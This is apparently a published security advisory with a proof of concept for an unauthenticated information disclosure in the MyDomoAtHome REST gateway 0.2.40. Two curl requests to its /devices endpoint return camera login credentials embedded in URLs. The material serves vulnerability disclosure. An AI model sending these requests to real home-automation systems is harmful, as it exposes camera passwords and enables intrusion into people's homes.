@@ -1,0 +1,72 @@
+# Exploit: MyDomoAtHome REST API Domoticz ISS Gateway 0.2.40 - Information Disclosure
+# Date: 2019-12-30
+# Author: LiquidWorm
+# Vendor: Emmanuel
+# Product web page: https://github.com/empierre/MyDomoAtHome
+# https://www.domoticz.com/wiki/ImperiHome
+# https://docs.imperihome.com/app/iss
+# Affected version: 0.2.40
+# Advisory ID: ZSL-2019-5555
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5555.php
+
+MyDomoAtHome (MDAH) REST API Domoticz ISS Gateway 0.2.40 Information Disclosure
+
+
+Vendor: Emmanuel
+Product web page: https://github.com/empierre/MyDomoAtHome
+                  https://www.domoticz.com/wiki/ImperiHome
+                  https://docs.imperihome.com/app/iss
+Affected version: 0.2.40
+
+Summary: REST Gateway between Domoticz and Imperihome ISS. Domoticz is a home automation
+system with a pretty wide library of supported devices, ranging from weather stations to
+smoke detectors to remote controls, and a large number of additional third-party integrations
+are documented on the project's website. It is designed with an HTML5 frontend, making it
+accessible from desktop browsers and most modern smartphones, and is lightweight, running
+on many low-power devices like the Raspberry Pi.
+
+Desc: MyDomoAtHome REST API is affected by an information disclosure vulnerability due to
+improper access control enforcement. An unauthenticated remote attacker can exploit this,
+via a specially crafted request to gain access to sensitive information.
+
+Tested on: NodeJS: 10.15.0, 8.15.1, 8.15.0, 8.11.1, 8.9.4, 4.8.7, 4.2.2
+           Webmanager/Engine: EJS
+           Renderer: Express
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2019-5555
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5555.php
+
+
+07.11.2019
+
+--
+
+
+--snip--
+Device Type string: DevCamera
+Param Key        Description
+----------------------------
+localjpegurl     Local URL to the JPEG snapshot of the camera (Note : login/pass can be passed like this http://login:pass@url)
+localmjpegurl    Local URL to the camera's MJPEG stream
+remotejpegurl    Remote URL to the JPEG snapshot of the camera
+remotemjpegurl   Remote URL to the camera's MJPEG stream
+--snip--
+
+
+PoC #1:
+-------
+
+root@kali:~/domoticz# curl -s http://192.168.0.100:3001/devices |tail -c $((100+850))
+[{"value":"http://admin:s3cr3t0P4ssw0rduz@192.168.0.50:8083/cgi-bin/CGIProxy.fcgi?cmd=snapPicture2&usr=admin&pwd=s3cr3t0P4ssw0rduz","key":"localjpegurl"},{"value":"http://192.168.0.50:8083/cgi-bin/CGIProxy.fcgi?cmd=snapPicture2&usr=admin&pwd=s3cr3t0P4ssw0rduz","key":"remotejpegurl"}],"name":"Extérieur","type":"DevCamera","id":"2_cam","room":"Switches"},{"params":[{"value":"http://admin2:An0th3rs3cr3tp4ss@192.168.0.15:8084/cgi-bin/CGIProxy.fcgi?cmd=snapPicture2&usr=admin2&pwd=An0th3rs3cr3tp4ss","key":"localjpegurl"},{"value":"http://192.168.0.50:8083/cgi-bin/CGIProxy.fcgi?cmd=snapPicture2&usr=admin&pwd=s3cr3t0P4ssw0rduz","key":"remotejpegurl"}],"name":"cuisine","type":"DevCamera","id":"3_cam","room":"Switches"},{"params":[{"value":"http://127.0.0.1:8080/uvccapture.cgi","key":"localjpegurl"},{"value":"http://192.168.0.50:8083/cgi-bin/CGIProxy.fcgi?cmd=snapPicture2&usr=admin&pwd=s3cr3t0P4ssw0rduz","key":"remotejpegurl"}],"name":"uvccam","type":"DevCamera","id":"4_cam","room":"Switches"}]}
+
+
+PoC #2:
+-------
+
+root@kali:~/domoticz# curl -s http://192.168.1.100:3001/devices |tail -c $((200-22))
+{"id":"C0","name":"Portail","type":"DevCamera","room":"Switches","params":[{"key":"localjpegurl","value":"http://admin:y3T4n0ther1&&@http://192.168.1.210/doc/page/preview.asp"}]}]}
